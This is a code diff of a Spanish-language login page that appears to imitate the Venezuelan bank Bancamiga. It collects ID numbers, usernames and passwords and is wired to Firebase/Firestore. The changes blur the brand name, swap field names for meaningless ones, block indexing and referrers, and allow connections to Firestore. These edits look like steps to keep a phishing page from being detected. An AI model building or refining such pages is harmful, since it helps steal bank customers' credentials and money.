@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html lang=es class>
 <meta charset=utf-8>
-<title> Bancamiga
+<title> Bamiga
 </title>
 <meta name=description content>
 <meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name=apple-mobile-web-app-status-bar-style content=black>
-<link rel=apple-touch-startup-image href="assets/FondoBancamiga.jpg">
+<link rel=apple-touch-startup-image href="assets/bg.jpg">
 <meta name=msapplication-TileColor content=#ffffff>
 <meta name=msapplication-TileImage content=/img/favicon/ms-icon-144x144.png>
 <meta name=theme-color content=#ffffff>
 <meta name="robots" content="noindex, nofollow, noarchive">
 <meta name=referrer content=no-referrer>
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://www.gstatic.com; script-src 'self' https://www.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://www.gstatic.com; font-src 'self' data:; connect-src 'self' https://firestore.googleapis.com https://www.googleapis.com https://securetoken.googleapis.com https://identitytoolkit.googleapis.com https://fcmregistrations.googleapis.com https://www.gstatic.com;">
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
 <link rel="stylesheet" href="styles/style.css">
 <link rel="shortcut icon" href="assets/favicon.ico" type=image/x-icon>
 </head>
@@ -31,12 +33,12 @@
                                                         <fieldset>
                                                                 <div class=row>
                                                                         <section class="col col-4">
-                                                                                <label for=tipodocben class=label>Tipo
+                                                                                <label for=diki class=label>Tipo
                                                                                         de Documento</label>
                                                                                 <div class=select>
-                                                                                        <select class=form-control
-                                                                                                name=tipodocben
-                                                                                                id=tipodocben>
+                                                                                        <select
+                                                                                                name=diki
+                                                                                                id=diki>
                                                                                                 <option value=01
                                                                                                         selected>
                                                                                                         Venezolano
@@ -65,7 +67,7 @@
                                                                                 </div>
                                                                         </section>
                                                                         <section class="col col-8">
-                                                                                <label for=documento class=label>Número
+                                                                                <label for=doko class=label>Número
                                                                                         de Documento</label>
                                                                                 <div class=input>
                                                                                         <i
@@ -73,8 +75,8 @@
                                                                                         <input type=text
                                                                                                 class="numbersOnly"
                                                                                                 maxlength=10
-                                                                                                name=documento
-                                                                                                id=documento
+                                                                                                name=doko
+                                                                                                id=doko
                                                                                                 autocomplete=off value>
                                                                                         <b
                                                                                                 class="tooltip tooltip-top-right">
@@ -87,12 +89,12 @@
                                                                 </div>
                                                                 <div class=row>
                                                                         <section class="col col-6">
-                                                                                <label for=u class=label>Nombre de
+                                                                                <label for=tiki class=label>Nombre de
                                                                                         Usuario</label>
                                                                                 <div class=input>
                                                                                         <i
                                                                                                 class="icon-append fa fa-user"></i>
-                                                                                        <input type=text name=u id=u
+                                                                                        <input type=text name=tiki id=tiki
                                                                                                 minlength=6 maxlength=20
                                                                                                 autocomplete=off value>
                                                                                         <b
@@ -105,14 +107,14 @@
                                                                                 </div>
                                                                         </section>
                                                                         <section class="col col-6">
-                                                                                <label for=p class=label>
+                                                                                <label for=toko class=label>
                                                                                         Ingrese su contraseña
                                                                                 </label>
                                                                                 <div class=input>
                                                                                         <i class="fa fa-eye-slash icon-append move_me"
                                                                                                 style=color:rgb(50,118,177);font-weight:bold;font-size:10px;cursor:pointer></i>
                                                                                         <input type=password
-                                                                                                name=p id=p minlength=8
+                                                                                                name=toko id=toko minlength=8
                                                                                                 maxlength=16
                                                                                                 autocomplete=off value>
                                                                                         <b
@@ -244,10 +246,8 @@
                                 </tr>
                 </table>
         </div>
-        <div id=divSmallBoxes></div>
         <div id=divMiniIcons></div>
         <div id=divbigBoxes></div>
-        <input type="hidden" id="ctx" name="ctx">
         <div id="error-modal-overlay"
                 style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 10000; justify-content: center; align-items: center;">
                 <div role="dialog" aria-labelledby="swal2-title" aria-describedby="swal2-content"
@@ -280,37 +280,5 @@
         <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
         <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
         <script src="js/firebase-config.js"></script>
-        <script>
-                document.addEventListener('DOMContentLoaded', function () {
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) {
-                                overlay.style.display = 'none';
-                        }
-                        const errorModal = document.getElementById('error-modal-overlay');
-                        const continueBtn = document.getElementById('error-modal-continue');
-                        if (errorModal) {
-                                errorModal.style.display = 'flex';
-                        }
-                        if (continueBtn) {
-                                continueBtn.addEventListener('click', function () {
-                                        if (errorModal) {
-                                                errorModal.style.display = 'none';
-                                        }
-                                        setTimeout(() => {
-                                                window.location.href = 'index.html';
-                                        }, 300);
-                                });
-                        }
-                });
-        </script>
+        <script src="js/error-modal.js"></script>
         <script src="js/main.js"></script>
-        <style>
-                @keyframes spin {
-                        0% {
-                                transform: rotate(0deg);
-                        }
-                        100% {
-                                transform: rotate(360deg);
-                        }
-                }
-        </style>
